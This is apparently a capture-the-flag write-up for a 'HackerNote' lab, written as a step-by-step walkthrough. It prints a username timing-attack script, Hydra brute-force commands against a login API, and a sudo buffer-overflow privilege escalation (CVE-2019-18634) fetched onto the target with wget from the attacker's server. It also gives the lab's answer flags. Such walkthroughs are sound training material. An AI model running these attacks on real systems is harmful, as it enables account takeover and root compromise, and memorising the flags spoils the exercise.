@@ -1,0 +1,422 @@
+HACKERNOTE.
+
+
+
+TASK 1: RECONAISSANCE.
+1.1. WHICH PORTS ARE OPEN? (IN NUMERICAL ORDER).
+Quick nmap scan:
+nmap -sS -T4 -sV 10.10.43.192
+OUTPUT:
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Answer:
+22,80,8080
+
+
+
+1.2. WHAT PROGRAMMING LANGUAGE IS THE BACKEND WRITTEN IN?
+Answer (from last question):
+go (golang)
+
+
+
+
+TASK 2: INVESTIGATE:
+2.1. CREATE YOUR OWN USER ACCOUNT:
+Steps:
+1. Visit http://10.10.43.192/.
+2. Click login.
+3. Complete user creation. Fields:
+Username: user
+Password: password
+Password hint: hint
+OUTPUT:
+Sucessfully created a user account.
+
+
+
+2.2. LOG INTO YOUR ACCOUNT:
+Complete login portal (same page) with credentials from last question.
+OUTPUT (redirected to http://10.10.43.192/notes/):
+Your notes:
+Create New Note
+
+
+
+2.3. TRY AND LOG IN TO AN INVALID USER ACCOUNT:
+Steps:
+1. Logout.
+2. Login.
+3. Try random credentials:
+Username: 123user456
+Password: pass
+OUTPUT:
+Invalid Username Or Password.
+
+
+
+2.4. TRY AND LOG IN TO YOUR ACCOUNT, WITH AN INCORRECT PASSWORD:
+Try:
+Username: user
+Password: wrong
+OUTPUT:
+First:
+Logging you in... Invalid Username Or Password
+Then:
+Invalid Username Or Password.
+
+
+
+2.5. NOTICE THE TIMING DIFFERENCE. THIS ALLOWS USER ENUMERATION:
+As shown in the last 2 tasks outputs, we can differentiate 2 situations by the output of the login attempt:
+Wrong username, wrong password. OUTPUT:
+Invalid Username Or Password.
+Right username, wrong password. 
+FIRST OUTPUT::
+Logging you in... Invalid Username Or Password
+SECOND OUTPUT:
+Invalid Username Or Password.
+
+
+
+
+TASK 3: EXPLOIT:
+3.1. TRY TO WRITE A SCRIPT TO PERFORM A TIMING ATTACK:
+Check login requests. Steps:
+1. Right click Login button.
+2. Open Inspect.
+3. Go to Network.
+4. Try a random credential pair and hit Login.
+5. Click file named login.
+6. Go to Payload.
+OUTPUT (Request Payload):
+{username: "wrong", password: "test"}
+
+
+Get the exploit:
+Grab exploit.py from https://github.com/NinjaJc01/hackerNoteExploits.
+Note:
+To date, I don't know enough python to make my own exploit from scratch (even with the clues).
+
+
+Get the username list:
+Grab names.txt from https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names.
+Note:
+We could use the file from the Honeypot folder (https://github.com/danielmiessler/SecLists/blob/master/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt). But since it is twice as long, and the room creator suggests the shorter one, we won't.
+
+
+Show the script:
+cat exploit.py
+OUTPUT:
+# Timing attack exploit on the login form for hackerNote
+# You can increase your success chance by adding your own username to the top of the list
+# Assumes you have at least ONE correct username, create an account and use that!
+import requests as r
+import time
+import json
+URL = "http://localhost:8081/api/user/login"
+USERNAME_FILE = open("names.txt", "r")
+usernames = []
+for line in USERNAME_FILE:  # Read in usernames from the wordlist
+    usernames.append(line.replace("\n", ""))
+
+timings = dict()
+
+
+def doLogin(user):  # Make the HTTP request to the API
+    creds = {"username": user, "password": "invalidPassword!"}
+    response = r.post(URL, json=creds)
+    if response.status_code != 200:  # This means there was an API error
+        print("Error:", response.status_code)
+
+
+print("Starting POST Requests")
+
+for user in usernames:
+    # Do a request for every user in the list, and time how long it takes
+    startTime = time.time()
+    doLogin(user)
+    endTime = time.time()
+    # record the time for this user along with the username
+    timings[user] = endTime - startTime
+    # Wait to avoid DoSing the server which causes unreliable results
+    time.sleep(0.01)
+
+print("Finished POST requests")
+
+# Longer times normally mean valid usernames as passwords were verified
+largestTime = max(timings.values())
+smallestTime = min(timings.values())
+# Ideally the smallest times should be near instant, and largest should be 1+ seconds
+print("Time delta:", largestTime-smallestTime, "seconds (larger is better)")
+
+# A valid username means the server will hash the password
+# As this takes time, the longer requests are likely to be valid users
+# The longer the request took, the more likely the request is to be valid.
+for user, time in timings.items():
+    if time >= largestTime * 0.9:
+        # with 10% time tolerence
+        print(user, "is likely to be valid")
+
+
+
+Note:
+Before we change the exploit script to work on our target, we need to find the real login portal (backend).
+Find backend login portal:
+On the same inspection from before. Steps:
+1. Go to Headers.
+2. Read General > Request URL.
+OUTPUT:
+http://10.10.43.192/api/user/login
+
+
+Note:
+We will manually send a curl to our backend login to test if it's the right one.
+Test backend login:
+curl -X POST http://10.10.43.192/api/user/login -H "Content-Type: application/json" -d '{"username":"test","password":"test"}'
+OUTPUT:
+{"status":"Invalid Username Or Password"}
+Note:
+It works properly.
+
+
+Update url on exploit.py:
+From: "http://localhost:8081/api/user/login"
+To: "http://10.10.43.192/api/user/login"
+
+
+Note:
+We are using the names.txt file, and it is stored in the same directory as the exploit, so we don't need to change the USERNAME_FILE variable. But we will add our own username, as the script asks us to do:
+Nano into names.txt, and add top line:
+user
+
+
+Run script:
+python3 exploit.py
+OUTPUT:
+james is likely to be valid
+Note:
+It isn't surprising that we got just 1 user, since before creating our own account, the site mentioned there was only 1 user.
+	
+
+
+
+TASK 4: ATTACK PASSWORDS:
+4.1. FORM THE HYDRA COMMAND TO ATTACK THE LOGIN API ROUTE:
+Get james hint. Steps:
+1. Set username james.
+2. Click I forgot my password.
+OUTPUT:
+Hint: My favourite colour and my favourite number
+
+
+Note:
+We want to combine a colour and a digit wordlist, to create one tailored to james.
+Provided zip extraction:
+unzip wordlists_1581610609109.zip
+OUTPUT:
+Archive:  wordlists_1581610609109.zip
+ extracting: colors.txt              
+ extracting: numbers.txt 
+
+
+Download and setup hashcat-utils:
+git clone https://github.com/hashcat/hashcat-utils.git
+cd hashcat-utils/src
+make
+
+
+Run combinator:
+./combinator.bin ~/Downloads/colors.txt ~/Downloads/numbers.txt > wordlist.txt 
+
+
+Copy wordlist over to home:
+cp wordlist.txt ~/wordlist.txt
+
+
+
+Hydra api bruteforce syntax:
+hydra -l <username> -P <wordlist> 192.168.2.62 http-post-form <path>:<body>:<fail_message>
+
+
+Filled in  command:
+hydra -l james -P ~/wordlist.txt 192.168.2.62 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password" -V
+
+
+
+4.2. HOW MANY PASSWORDS WERE IN YOUR WORDLIST?
+Number of passwords in wordlist:
+wc -l wordlist.txt
+OUTPUT:
+180 wordlist.txt
+
+
+
+4.3. WHAT WAS THE USER'S PASSWORD?
+Execute hydra bruteforce:
+hydra -l james -P ~/wordlist.txt 192.168.2.62 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password" -V
+OUTPUT:
+[ERROR] all children were disabled due too many connection errors
+Note:
+Looks like we need to reduce parallelization.
+
+
+Slower bruteforce:
+hydra -l james -P ~/wordlist.txt 192.168.2.62 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password" -t 4 -V
+
+
+MISTAKE:
+For some reason, the task fills in the ip for hydra as 192.168.2.62, when in reality, we need to use the login backend ip (10.10.43.192).
+RIGHT hydra bruteforce:
+hydra -l james -P ~/wordlist.txt 10.10.43.192 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password" -V
+Note:
+Now we can see in the output it runs properly.
+OUTPUT:
+[80][http-post-form] host: 10.10.43.192   login: james   password: blue7
+
+
+
+4.4. LOGIN AS THE USER TO THE PLATFORM:
+Note:
+Login credentials: james, blue7.
+OUTPUT:
+My SSH details
+So that I don't forget, my SSH password is dak4ddb37b
+
+
+
+4.5. WHAT'S THE USER'S SSH PASSWORD?
+From last task, password is:
+dak4ddb37b
+
+
+
+4.6. LOG IN AS THE USER TO SSH WITH THE CREDENTIALS YOU HAVE:
+Ssh connection: 
+james@10.10.43.192
+Note:
+Succesful login.
+
+
+
+4.7. WHAT'S THE USER FLAG?
+List directory:
+ls
+OUTPUT:
+user.txt
+
+
+Check the flag:
+cat user.txt
+OUTPUT:
+thm{56911bd7ba1371a3221478aa5c094d68}
+
+
+
+
+TASK 5: ESCALATE:
+5.1. WHAT IS THE CVE NUMBER FOR THE EXPLOIT?
+Note:
+jame's password is dak4ddb37b
+Check sudo permissions:
+sudo -l
+OUTPUT:
+Sorry, user james may not run sudo on hackernote.
+
+
+Note:
+james can't run anything as root, but we get a clue towards a pwdfeedback exploit.
+Doing research, we find Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC) (https://www.exploit-db.com/exploits/47995), which has cve:
+CVE-2019-18634
+
+
+
+5.2. FIND THE EXPLOIT FROM https://github.com/saleemrashid/ AND DOWNLOAD THE FILES.
+Note:
+We don't even need to do research for an exploit, since https://github.com/saleemrashid/ is provided.
+We grab the file: https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c
+
+
+
+5.3. COMPILE THE EXPLOIT FROM KALI LINUX.
+Compile exploit:
+gcc exploit.c -o exploit_binary
+
+
+
+5.4. SCP THE EXPLOIT BINARY TO THE BOX.
+Check james current directory:
+pwd
+OUTPUT:
+/home/james
+
+
+Note:
+james password is dak4ddb37b.
+Scp the binary:
+scp exploit_binary james@10.10.43.192:/home/james
+
+
+
+5.5. RUN THE EXPLOIT, GET ROOT:
+Execute the binary:
+./exploit_binary
+OUTPUT:
+./exploit_binary: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit_binary)
+Note:
+Surprisingly, something went wrong. we will retry 5.2 to 5.5.
+
+
+
+
+TASK 5: 5.2-5.5:
+Note:
+We will try to clone the repository instead.
+Clone it:
+git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git 
+
+WHAT WE GOT WRONG:
+5.3 asks to compile from kali linux, which I guess means using make, NOT gcc.
+Compile exploit:
+cd sudo-cve-2019-18634/;make
+OUTPUT:
+cc -Os -g3 -std=c11 -Wall -Wextra -Wpedantic -static -o exploit exploit.c
+
+
+Note:
+To practice a bit, we will download via curl, not scp.
+Set up http server:
+python3 -m http.server 8000
+
+
+Download from target:
+wget http://10.23.25.109:8000/exploit
+
+
+Make exploit executable:
+chmod +x exploit
+
+
+Run exploit:
+OUTPUT:
+[sudo] password for james: 
+Sorry, try again.
+# 
+
+
+
+
+5.6. WHAT IS THE ROOT FLAG?
+Check flag:
+cat /root/root.txt
+OUTPUT:
+thm{af55ada6c2445446eb0606b5a2d3a4d2}
+
+
+
+
+6. COMMENTS ON REALISM AND FURTHER READING.
+Nothing to do here.
